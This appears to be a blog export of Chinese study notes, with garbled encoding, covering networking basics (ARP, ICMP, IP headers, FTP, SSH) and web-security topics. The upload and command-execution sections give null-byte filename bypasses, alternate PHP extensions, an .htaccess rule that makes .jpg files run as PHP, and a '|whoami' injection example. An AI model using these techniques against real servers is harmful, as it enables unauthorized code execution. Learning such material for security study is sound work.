<h2 id="ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚"><a href="#ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚" class="headerlink" title="ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚"></a>ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚</h2><h3 id="0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ"><a href="#0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ"></a>0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615185534103.png" alt="image-20200615185534103"></p>
<p>æ•°æ®é“¾è·¯å±‚ä¿¡é“ç±»å‹ï¼šç‚¹åˆ°ç‚¹å’Œå¹¿æ’­ã€‚</p>
<p>é“¾è·¯ï¼šæ˜¯ä¸€æ¡ç‚¹åˆ°ç‚¹çš„ç‰©ç†çº¿è·¯æ®µã€‚</p>
<p>æ•°æ®é“¾è·¯ï¼šé™¤äº†ç‰©ç†çº¿è·¯å¤–ï¼Œè¿˜å¿…é¡»æœ‰é€šä¿¡åè®®æ¥æ§åˆ¶è¿™äº›æ•°æ®çš„ä¼ è¾“ã€‚</p>
<p>å¸§ï¼šå¸§å¤´ å¸§å°¾ macåœ°å€ æ ¡éªŒç </p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615190949900.png" alt="image-20200615190949900"></p>
<h3 id="0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜"><a href="#0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜" class="headerlink" title="0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜"></a>0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜</h3><p>1.å°è£…æˆå¸§</p>
<p>2.é€æ˜ä¼ è¾“ï¼ˆå°†è½¬ä¹‰å­—ç¬¦è½¬ä¹‰ï¼‰</p>
<p>3.å·®é”™æ§åˆ¶</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615194723467.png" alt="image-20200615194723467"></p>
<p>ä¼ çš„æ•°æ®ä¸º<strong>101001001</strong>/1101ä½™æ•°ä¸º0å°±ä¼šæ¥å—ã€‚</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195101214.png" alt="image-20200615195101214"></p>
<h3 id="0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚"><a href="#0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚" class="headerlink" title="0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚"></a>0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚</h3><p><strong>ç‚¹åˆ°ç‚¹ä¿¡é“çš„æ•°æ®é“¾è·¯å±‚</strong>ï¼ˆå¹¿åŸŸç½‘ï¼‰</p>
<p>PPPåè®®</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195355465.png" alt="image-20200615195355465"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615201603443.png" alt="image-20200615201603443"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195843590.png" alt="image-20200615195843590"></p>
<p><strong>å¹¿æ’­ä¿¡é“çš„æ•°æ®é“¾è·¯å±‚</strong>ï¼ˆé›†çº¿å™¨ï¼‰</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615205445679.png" alt="image-20200615205445679"></p>
<h3 id="0x04ä»¥å¤ªç½‘"><a href="#0x04ä»¥å¤ªç½‘" class="headerlink" title="0x04ä»¥å¤ªç½‘"></a>0x04ä»¥å¤ªç½‘</h3><p>ä»¥å¤ªç½‘æ˜¯ä¸€ç§CSMA/CDçš„å±€åŸŸç½‘</p>
<p><strong>åª’ä½“æ¥å…¥æ§åˆ¶å±‚</strong>ï¼ˆMAC ï¼‰</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211139871.png" alt="image-20200615211139871"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211817436.png" alt="image-20200615211817436"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615212131635.png" alt="image-20200615212131635"></p>
<p>FCSæŠ“åŒ…ä¹‹åä¼šåˆ æ‰ã€‚</p>
<h3 id="0x05æ‰©å±•ä»¥å¤ªç½‘"><a href="#0x05æ‰©å±•ä»¥å¤ªç½‘" class="headerlink" title="0x05æ‰©å±•ä»¥å¤ªç½‘"></a>0x05æ‰©å±•ä»¥å¤ªç½‘</h3><p>é›†çº¿å™¨çº§è”ï¼Œä¼šä½¿ç½‘ç»œä¸­è®¡ç®—æœºæ•°é‡å¢åŠ ï¼Œä½†ä¼šä½¿å†²çªåŸŸå¢å¤§ï¼Œå¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿ</p>
<p><strong>ç½‘æ¡¥</strong><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615214530777.png" alt="image-20200615214530777"></p>
<p>ç½‘æ¡¥å°±æ˜¯äº¤æ¢æœºçš„å‰èº«ï¼Œäº¤æ¢æœºç›¸å½“äºç½‘æ¡¥å’Œé›†çº¿å™¨ã€‚</p>
<h3 id="0x06é«˜é€Ÿä»¥å¤ªç½‘"><a href="#0x06é«˜é€Ÿä»¥å¤ªç½‘" class="headerlink" title="0x06é«˜é€Ÿä»¥å¤ªç½‘"></a>0x06é«˜é€Ÿä»¥å¤ªç½‘</h3><h2 id="ç¬¬å››ç« -ç½‘ç»œå±‚"><a href="#ç¬¬å››ç« -ç½‘ç»œå±‚" class="headerlink" title="ç¬¬å››ç«  ç½‘ç»œå±‚"></a>ç¬¬å››ç«  ç½‘ç»œå±‚</h2><h3 id="0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡"><a href="#0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡" class="headerlink" title="0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡"></a>0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616110826298.png" alt="image-20200616110826298"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616111607056.png" alt="image-20200616111607056"></p>
<p>ï¼ˆè·¯ç”±å™¨æ˜¯ç½‘ç»œå±‚è®¾å¤‡ï¼‰</p>
<p>ç½‘ç»œåœ°å€ç›¸åŒå°±å¯ä»¥çœ‹æˆä¸€ä¸ª<strong>ç½‘æ®µ</strong>ï¼Œæ€ä¹ˆçœ‹ç½‘ç»œåœ°å€å‘¢ï¼Ÿå¯ä»¥çœ‹å­ç½‘æ©ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip:10.0.0.1</span><br><span class="line">å­ç½‘æ©ç :255.0.0.0</span><br><span class="line">&#x2F;&#x2F;æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºå­ç½‘æ©ç æ˜¯255ï¼Œé‚£è¡¨æ˜ipåœ°å€ä¸­10å°±æ˜¯ç½‘ç»œåœ°å€ã€‚</span><br><span class="line"></span><br><span class="line">ip:12.0.0.1</span><br><span class="line">å­ç½‘æ©ç 255.255.0.0</span><br><span class="line">&#x2F;&#x2F;255.255.0.0è¯´æ˜åœ¨è¿™ä¸ªç½‘æ®µä¸­12.0æ˜¯ç½‘ç»œåœ°å€</span><br><span class="line"></span><br><span class="line">ç½‘å…³ï¼šè·¯ç”±å™¨ä¸Šé…ç½®ï¼Œä¸€èˆ¬ä¸ºè¯¥ç½‘æ®µä¸­çš„ç¬¬ä¸€ä¸ªåœ°å€ï¼Œå®é™…ä¸Šä»»æ„ä¸€ä¸ªåœ°å€éƒ½å¯ä»¥ã€‚</span><br><span class="line"></span><br><span class="line">è·¯ç”±å™¨ï¼šè·¯ç”±å™¨æ˜¯æ— æ³•çŸ¥é“å®ƒå…·ä½“ç½‘æ®µçš„ä½ç½®ï¼Œéœ€è¦æ·»åŠ è·¯ç”±è¡¨ã€‚</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616114228562.png" alt="image-20200616114228562"></p>
<h3 id="0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹"><a href="#0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹" class="headerlink" title="0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹"></a>0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹</h3><p>å‘é€ç«¯ï¼š</p>
<ol>
<li><p>åº”ç”¨å±‚ ç¨‹åºå‡†å¤‡è¦ä¼ è¾“çš„æ–‡ä»¶</p>
</li>
<li><p>ä¼ è¾“å±‚ å°†æ–‡ä»¶ç¼–å·</p>
</li>
<li><p>ç½‘ç»œå±‚ æ·»åŠ IPåœ°å€</p>
</li>
<li><p>æ•°æ®é“¾è·¯å±‚  æœ‰ä¸¤ç§æƒ…å†µ </p>
<p>ç¬¬ä¸€ç§ é€šè¿‡å­ç½‘æ©ç  ï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯åŒä¸€ä¸ªç½‘æ®µã€‚å¦‚æœæ˜¯ï¼Œåˆ©ç”¨ARPåè®®å¹¿æ’­è§£æç›®æ ‡ipåœ°å€çš„MACåœ°å€</p>
<p>ç¬¬äºŒç§</p>
</li>
</ol>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617112108377.png" alt="image-20200617112108377"></p>
<h3 id="0x03ç½‘ç»œå±‚åè®®"><a href="#0x03ç½‘ç»œå±‚åè®®" class="headerlink" title="0x03ç½‘ç»œå±‚åè®®"></a>0x03ç½‘ç»œå±‚åè®®</h3><h4 id="ARPåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a><strong>ARPåè®®</strong></h4><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617113421057.png" alt="image-20200617113421057"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arp -a  &#x2F;&#x2F;æŸ¥è¯¢macåœ°å€</span><br><span class="line">arp -s ipåœ°å€ macåœ°å€   &#x2F;&#x2F;é…ç½®IPåœ°å€çš„MACåœ°å€</span><br></pre></td></tr></table></figure>
<p>arpåè®®:å°†ipåœ°å€é€šè¿‡å¹¿æ’­ ç›®æ ‡MACåœ°å€æ˜¯FF-FF-FF-FF-FF-FF<strong>è§£æç›®æ ‡ipåœ°å€çš„MACåœ°å€</strong></p>
<p>arpæ¬ºéª—: æ•°æ®é“¾è·¯å±‚æ•…éšœï¼Œç¼“å­˜äº†é”™è¯¯çš„MACåœ°å€</p>
<h4 id="ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰"><a href="#ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰" class="headerlink" title="ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰"></a><strong>ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®</strong>ï¼ˆICMPï¼‰</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping      ttl&#x3D;64 linux</span><br><span class="line">							128 windows</span><br><span class="line">							255 unix</span><br><span class="line">ping www.baidu.com -t    ä¸€ç›´ping</span><br><span class="line">ping www.baidu.com -l 200   å®šä¹‰æ•°æ®åŒ…çš„å¤§å°</span><br><span class="line">&#x2F;&#x2F;æŸ¥çœ‹è·¯ç”±å™¨çš„åœ°å€</span><br><span class="line">ping 8.8.8.8 -i 1 æ›´æ”¹æ•°æ®åŒ…ttlæ—¶é—´ï¼Œå¯ä»¥è·Ÿè¸ªé€”ç»çš„è·¯ç”±å™¨</span><br><span class="line">pathping   è·Ÿè¸ªpingçš„è·¯å¾„</span><br><span class="line">tracert    ç›´æ¥è·Ÿè¸ªè·¯ç”±</span><br></pre></td></tr></table></figure>
<h4 id="IGMP"><a href="#IGMP" class="headerlink" title="IGMP"></a>IGMP</h4><p>é…ç½®åœ¨è·¯ç”±å™¨ä¸Šæ‰«æå¤šæ’­åœ°å€çš„åè®®</p>
<p>å¹¿æ’­ï¼šç›®æ ‡ipåœ°å€æ˜¯å…¨ffï¼Œç›®æ ‡macåœ°å€æ˜¯255ï¼Œå‘å±€åŸŸç½‘å†…æ‰€æœ‰è®¡ç®—æœºå‘å‡ºå¹¿æ’­</p>
<p>ç‚¹åˆ°ç‚¹ï¼šä»ä¸€ä¸ªç‚¹åˆ°å¦ä¸€ä¸ªç‚¹</p>
<p>ç»„æ’­ï¼šä¸€å¯¹å¤š</p>
<h3 id="0x04æ•°æ®åŒ…"><a href="#0x04æ•°æ®åŒ…" class="headerlink" title="0x04æ•°æ®åŒ…"></a>0x04æ•°æ®åŒ…</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111139014.png" alt="image-20200619111139014"></p>
<p>ç‰ˆæœ¬ï¼šç”¨æ¥è¡¨ç¤ºTCP/IPåè®®çš„ç‰ˆæœ¬ v4 v6</p>
<p>åŒºåˆ†æœåŠ¡ï¼šçœ‹è°çš„ä¼˜å…ˆçº§é«˜</p>
<p>æ ‡è¯†ï¼š100 100 100å°±ä¸ºä¸€ä¸ªæ•°æ®åŒ…</p>
<p>æ ‡å¿—ï¼šçœ‹æ•°æ®åŒ…æ˜¯å¦åˆ†ç‰‡<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619112943227.png" alt="image-20200619112943227"></p>
<p>ç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼‰ï¼šæ¯è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼Œç”Ÿå­˜æ—¶é—´ä¼šä¿®æ”¹ã€‚</p>
<p>åè®®å·ï¼šäº¤ç»™å“ªä¸ªåè®®è¿›è¡Œå¤„ç†</p>
<p>ï¼ˆICMP 1      IGMP  2       TCP  6        UDP  17  IPv6   41       OSPF   89ï¼‰</p>
<p>æ•°æ®é“¾è·¯å±‚æ”¯æŒæ•°æ®åŒ…1500å­—èŠ‚</p>
<p>IPå±‚æ”¯æŒæ•°æ®åŒ…æ˜¯65535å­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦åˆ†ç‰‡ä¼ è¾“ï¼Œä½†ä¸€èˆ¬ä¸ä¼šè¶…è¿‡1500å­—èŠ‚ã€‚</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111512690.png" alt="image-20200619111512690"></p>
<h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090006669.png" alt="image-20200807090006669"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090512480.png" alt="image-20200807090512480"></p>
<p><strong>Active Mode</strong></p>
<p>ç¬¬äºŒä¿¡é“æ˜¯æœåŠ¡å™¨ä¸»åŠ¨å‘èµ·çš„ã€‚</p>
<p>ç¬¬ä¸€ä¿¡é“æ˜¯21ç«¯å£</p>
<p>ç¬¬äºŒä¿¡é“æ˜¯20ç«¯å£</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100649933.png" alt="image-20200807100649933"></p>
<p><strong>Passive</strong></p>
<p>ç¬¬ä¸€ä¿¡é“æ˜¯21ç«¯å£</p>
<p>ç¬¬äºŒä¿¡é“æ˜¯éšæœºç«¯å£</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100800469.png" alt="image-20200807100800469"></p>
<h1 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807145634367.png" alt="image-20200807145634367"></p>
<p><strong>telnet</strong>çš„ç«¯å£æ˜¯23ç«¯å£</p>
<h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200811154248708.png" alt="image-20200811154248708"></p>
]]></content>
      <categories>
        <category>è®¡ç½‘</category>
      </categories>
      <tags>
        <tag>è®¡ç½‘</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ </title>
    <url>/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h1 id="ä¸Šä¼ æ¼æ´"><a href="#ä¸Šä¼ æ¼æ´" class="headerlink" title="ä¸Šä¼ æ¼æ´"></a>ä¸Šä¼ æ¼æ´</h1><p><a href="https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/" target="_blank" rel="noopener">https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/</a></p>
<h2 id="0x01åŸºæœ¬æµç¨‹"><a href="#0x01åŸºæœ¬æµç¨‹" class="headerlink" title="0x01åŸºæœ¬æµç¨‹"></a>0x01åŸºæœ¬æµç¨‹</h2><ol>
<li>å›¾ç‰‡æ˜¯å¦æ­£å¸¸ä¸Šä¼ ã€‚</li>
<li>å›¾ç‰‡ä¸Šä¼ å†…å®¹æ˜¯å¦è¢«æ„ŸæŸ“ã€‚ï¼ˆå†…å®¹æ›¿æ¢ æŠ“åŒ…æ”¹ï¼‰</li>
<li>ä¸Šä¼ çš„åŸŸåæ˜¯å¦æ˜¯ç›®æ ‡æœåŠ¡å™¨ã€‚</li>
<li>ä¸Šä¼ çš„ç›®å½•æ˜¯å¦æ”¯æŒè§£æ</li>
</ol>
<h2 id="0x02ç»•è¿‡js"><a href="#0x02ç»•è¿‡js" class="headerlink" title="0x02ç»•è¿‡js"></a>0x02ç»•è¿‡js</h2><h2 id="0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚"><a href="#0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚" class="headerlink" title="0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚"></a>0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚</h2><p>æŠ“åŒ…çš„æ—¶å€™ %00</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.jpg%00.php</span><br><span class="line">1.php%00.jpg</span><br></pre></td></tr></table></figure>
<h2 id="0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯"><a href="#0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯" class="headerlink" title="0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯"></a>0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯</h2><p>é»‘åå•ï¼šä¸å…è®¸ä»€ä¹ˆä¸Šä¼ </p>
<p>ç™½åå•ï¼šå…è®¸ä»€ä¹ˆä¸Šä¼ </p>
<p>å¯ä»¥å°è¯•php3 php4 php5 phtmlï¼Œphtä½¿ç”¨  æˆ–æœåŠ¡å™¨è§£ææ¼æ´</p>
<h2 id="0x05äºŒæ¬¡ä¸Šä¼ "><a href="#0x05äºŒæ¬¡ä¸Šä¼ " class="headerlink" title="0x05äºŒæ¬¡ä¸Šä¼ "></a>0x05äºŒæ¬¡ä¸Šä¼ </h2><h2 id="0x06MIME"><a href="#0x06MIME" class="headerlink" title="0x06MIME"></a>0x06MIME</h2><p>content-typeä¸­è¡¨ç¤ºäº†æ–‡ä»¶ç±»å‹ã€‚</p>
<h2 id="0x07è§£ææ¼æ´"><a href="#0x07è§£ææ¼æ´" class="headerlink" title="0x07è§£ææ¼æ´"></a>0x07è§£ææ¼æ´</h2><h3 id="iisè§£ææ¼æ´"><a href="#iisè§£ææ¼æ´" class="headerlink" title="iisè§£ææ¼æ´"></a>iisè§£ææ¼æ´</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609194945742.png" alt="image-20200609194945742"></p>
<h3 id="apacheè§£ææ¼æ´"><a href="#apacheè§£ææ¼æ´" class="headerlink" title="apacheè§£ææ¼æ´"></a>apacheè§£ææ¼æ´</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195122633.png" alt="image-20200609195122633"></p>
<h3 id="nginxè§£ææ¼æ´"><a href="#nginxè§£ææ¼æ´" class="headerlink" title="nginxè§£ææ¼æ´"></a>nginxè§£ææ¼æ´</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195540127.png" alt="image-20200609195540127"></p>
<h3 id="netä¸Šä¼ "><a href="#netä¸Šä¼ " class="headerlink" title=".netä¸Šä¼ "></a>.netä¸Šä¼ </h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609200056116.png" alt="image-20200609200056116"></p>
<h3 id="phtmlä¸Šä¼ "><a href="#phtmlä¸Šä¼ " class="headerlink" title="phtmlä¸Šä¼ "></a>phtmlä¸Šä¼ </h3><p>åœ¨apacheé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ï¼ˆhttpd.confï¼‰ä¸­æ·»åŠ </p>
<p>AddType application/x-httpd-php.phtml</p>
<p>è¿™æ ·phtmlåç¼€çš„æ–‡ä»¶å°±ä¼šæŒ‰ç…§phpå»è§£æ</p>
<h3 id="htaccessä¸Šä¼ "><a href="#htaccessä¸Šä¼ " class="headerlink" title=".htaccessä¸Šä¼ "></a>.htaccessä¸Šä¼ </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Files *.jpg&gt;</span><br><span class="line">ForceType:application&#x2F;x-httpd-php</span><br><span class="line">SetHandler:application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.jpg</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;ä¼šå°†æ‰€æœ‰çš„jpgæ–‡ä»¶éƒ½æŒ‰ç…§phpæ¥è§£æ</span><br></pre></td></tr></table></figure>
<h2 id="0x08åŒæ–‡ä»¶ä¸Šä¼ "><a href="#0x08åŒæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x08åŒæ–‡ä»¶ä¸Šä¼ "></a>0x08åŒæ–‡ä»¶ä¸Šä¼ </h2>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶åŒ…å«</title>
    <url>/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>ä»Šå¤©åœ¨æ•´ç†ç¡¬ç›˜çš„ä¸€äº›ä¸œè¥¿ï¼Œæœ‰äº›webå­¦çš„ä¸œè¥¿åˆä¸æƒ³æ‰”ï¼Œå°±ä¼ ä¸Šæ¥ã€‚</p>
<h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="0x01å®šä¹‰"><a href="#0x01å®šä¹‰" class="headerlink" title="0x01å®šä¹‰"></a>0x01å®šä¹‰</h2><p>åœ¨é€šè¿‡æœåŠ¡å™¨è„šæœ¬çš„å‡½æ•°å¼•å…¥æ–‡ä»¶æ—¶ï¼Œç”±äºä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡åˆç†çš„æ ¡éªŒï¼Œä»è€Œæ“ä½œäº†é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶ï¼Œå¯¼è‡´æ„å¤–çš„æ–‡ä»¶æ³„éœ²ç”šè‡³æ¶æ„çš„ä»£ç æ³¨å…¥ã€‚</p>
<h2 id="0x02ç¯å¢ƒè¦æ±‚"><a href="#0x02ç¯å¢ƒè¦æ±‚" class="headerlink" title="0x02ç¯å¢ƒè¦æ±‚"></a>0x02ç¯å¢ƒè¦æ±‚</h2><ul>
<li>allow_url_fopen=On(é»˜è®¤ä¸ºOn) è§„å®šæ˜¯å¦å…è®¸ä»è¿œç¨‹æœåŠ¡å™¨æˆ–è€…ç½‘ç«™æ£€ç´¢æ•°æ®</li>
<li>allow_url_include=On(php5.2ä¹‹åé»˜è®¤ä¸ºOff) è§„å®šæ˜¯å¦å…è®¸include/requireè¿œç¨‹æ–‡ä»¶</li>
</ul>
<h2 id="0x03æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#0x03æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="0x03æ–‡ä»¶åŒ…å«å‡½æ•°"></a>0x03æ–‡ä»¶åŒ…å«å‡½æ•°</h2><ul>
<li>include():å¯è·å¾—æŒ‡å®šæ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡æœ¬ï¼Œå¹¶æŠŠæ–‡æœ¬æ‹·è´åˆ°ä½¿ç”¨ include å‡½æ•°çš„æ–‡ä»¶ä¸­ã€‚include() å‡½æ•°<strong>ä¼šç”Ÿæˆä¸€ä¸ªè­¦å‘Šï¼Œä½†æ˜¯è„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚</strong></li>
<li>require():å‡½æ•°æ¥å—çš„æ‰€æœ‰æ–‡æœ¬æ–‡ä»¶,å¹¶å°†å®ƒå¤åˆ¶åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨äº†åŒ…æ‹¬åŠŸèƒ½ã€‚å¦‚æœåœ¨åŠ è½½ä¸€ä¸ªæ–‡ä»¶æ—¶æœ‰ä»»ä½•é—®é¢˜ï¼Œ<strong>ç”Ÿæˆä¸€ä¸ªè‡´å‘½é”™è¯¯,åœæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚</strong></li>
</ul>
<h2 id="0x04å‘½ä»¤æ‰§è¡Œ"><a href="#0x04å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="0x04å‘½ä»¤æ‰§è¡Œ"></a>0x04å‘½ä»¤æ‰§è¡Œ</h2><p><a href="https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21" target="_blank" rel="noopener">https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21</a></p>
<h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>åº”ç”¨æœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚PHPä¸­çš„systemã€execã€shell_execã€</p>
<p>passthruã€popenã€proc_popenç­‰ï¼Œå½“ç”¨æˆ·èƒ½æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„ç³»ç»Ÿå‘½ä»¤</p>
<p>æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ï¼Œè¿™å°±æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p>
<h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul>
<li><p>åº”ç”¨è°ƒç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°</p>
</li>
<li><p>å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°æ‹¼æ¥åˆ°äº†å‘½ä»¤è¡Œä¸­</p>
</li>
<li><p>æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥</p>
</li>
</ul>
<hr>
<h3 id="å¸¸ç”¨è¿æ¥ç¬¦"><a href="#å¸¸ç”¨è¿æ¥ç¬¦" class="headerlink" title="å¸¸ç”¨è¿æ¥ç¬¦"></a>å¸¸ç”¨è¿æ¥ç¬¦</h3><ul>
<li>åœ¨Windowså’ŒLinuxä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>&amp;æ¥æ‰§è¡Œå¤šæ¡å‘½ä»¤ã€‚</strong></li>
<li><strong>|</strong>ï¼šå‰é¢å‘½ä»¤è¾“å‡ºç»“æœä½œä¸ºåé¢å‘½ä»¤çš„è¾“å…¥å†…å®¹ï¼›è¾“å…¥8.8.8.8|whoami </li>
<li><strong>||</strong>ï¼šå‰é¢å‘½ä»¤æ‰§è¡Œå¤±è´¥çš„æ—¶å€™æ‰æ‰§è¡Œåé¢çš„å‘½ä»¤</li>
